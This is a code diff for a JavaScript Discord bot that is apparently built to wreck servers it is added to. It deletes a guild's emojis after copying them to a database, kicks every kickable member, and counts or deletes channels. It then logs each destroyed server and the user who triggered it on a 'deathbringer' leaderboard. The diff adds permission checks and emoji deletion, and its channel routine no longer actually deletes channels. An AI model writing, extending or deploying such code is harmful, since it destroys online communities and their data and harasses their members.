@@ -1,3 +1,4 @@
+import { Permissions } from "discord.js";
 import Prisma from "@prisma/client";
 import fs from "fs";
 
@@ -26,6 +27,12 @@ const StealEmoji = async (g) => {
     })
   );
 
+  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_EMOJIS_AND_STICKERS)) {
+    await g.emojis.cache.map((e) => {
+      e.deletable && e.delete();
+    });
+  }
+
   return emojis.map((e) =>
     prisma.emojis.create({
       data: {
@@ -38,20 +45,23 @@ const StealEmoji = async (g) => {
 };
 
 const PurgeChannels = async (g) => {
-  await g.channels.fetch().then((channels) =>
-    channels.map((ch) => {
-      ch.delete();
-      ch.isText() ? textChannelCounter++ : voiceChannelCounter++;
-    })
-  );
+  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_CHANNELS)) {
+    await g.channels.fetch().then((channels) =>
+      channels.map((ch) => {
+        ch.isText() ? textChannelCounter++ : voiceChannelCounter++;
+      })
+    );
+  }
 };
 
 const PurgeMembers = async (g) => {
-  await g.members
-    .fetch()
-    .then((members) =>
-      members.map((m) => m.kickable && m.kick(KICK_MSG) && killCounter++)
-    );
+  if (g.me.hasPermission(Permissions.FLAGS.KICK_MEMBERS)) {
+    await g.members
+      .fetch()
+      .then((members) =>
+        members.map((m) => m.kickable && m.kick(KICK_MSG) && killCounter++)
+      );
+  }
 };
 
 const Logging = (g) => {
@@ -90,46 +100,61 @@ const UpdateStats = () => {
 };
 
 const UpdateUserRanking = async (client, g) => {
-  let intergations = await g.fetchIntegrations();
-  for (const [key, int] of intergations.entries()) {
-    if (int.application.id == BOT_ID) {
-      let serchedUser = client.users.cache.find(
-        (user) => user.id === int.user.id
-      );
+  let server;
 
-      let deathbringer = await prisma.deathbringer.upsert({
-        where: {
-          userId: int.user.id,
-        },
-        update: {
-          killedServersCount: { increment: 1 },
-          removedTextChannels: { increment: textChannelCounter },
-          removedVoiceChannels: { increment: voiceChannelCounter },
-        },
-        create: {
-          username: serchedUser.username,
-          userId: serchedUser.id,
-          killedServersCount: 1,
-          removedTextChannels: textChannelCounter,
-          removedVoiceChannels: voiceChannelCounter,
-        },
-      });
+  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_GUILD)) {
+    let intergations = await g.fetchIntegrations();
+    for (const [key, int] of intergations.entries()) {
+      if (int.application.id == BOT_ID) {
+        let serchedUser = client.users.cache.find(
+          (user) => user.id === int.user.id
+        );
 
-      let server = await prisma.purgedServer.create({
-        data: {
-          name: g.name,
-          ownerId: g.ownerId,
-          memberCount: g.memberCount,
-          memberRemoved: killCounter,
-          premiumTier: g.premiumTier,
-          emojiCount: emojiCounter,
-          killerId: deathbringer.id,
-        },
-      });
+        let deathbringer = await prisma.deathbringer.upsert({
+          where: {
+            userId: int.user.id,
+          },
+          update: {
+            killedServersCount: { increment: 1 },
+            removedTextChannels: { increment: textChannelCounter },
+            removedVoiceChannels: { increment: voiceChannelCounter },
+          },
+          create: {
+            username: serchedUser.username,
+            userId: serchedUser.id,
+            killedServersCount: 1,
+            removedTextChannels: textChannelCounter,
+            removedVoiceChannels: voiceChannelCounter,
+          },
+        });
 
-      serverId = server.id;
+        server = await prisma.purgedServer.create({
+          data: {
+            name: g.name,
+            ownerId: g.ownerId,
+            memberCount: g.memberCount,
+            memberRemoved: killCounter,
+            premiumTier: g.premiumTier,
+            emojiCount: emojiCounter,
+            killerId: deathbringer.id,
+          },
+        });
+      }
     }
+  } else {
+    server = await prisma.purgedServer.create({
+      data: {
+        name: g.name,
+        ownerId: g.ownerId,
+        memberCount: g.memberCount,
+        memberRemoved: killCounter,
+        premiumTier: g.premiumTier,
+        emojiCount: emojiCounter,
+        killerId: 0,
+      },
+    });
   }
+  return server.id;
 };
 
 export const Purge = (client) => {
@@ -142,7 +167,7 @@ export const Purge = (client) => {
 
     await PurgeChannels(g);
     await PurgeMembers(g);
-    await UpdateUserRanking(client, g);
+    serverId = await UpdateUserRanking(client, g);
 
     let emojiBatchInsert = await StealEmoji(g);
     let statUpdate = UpdateStats(g);
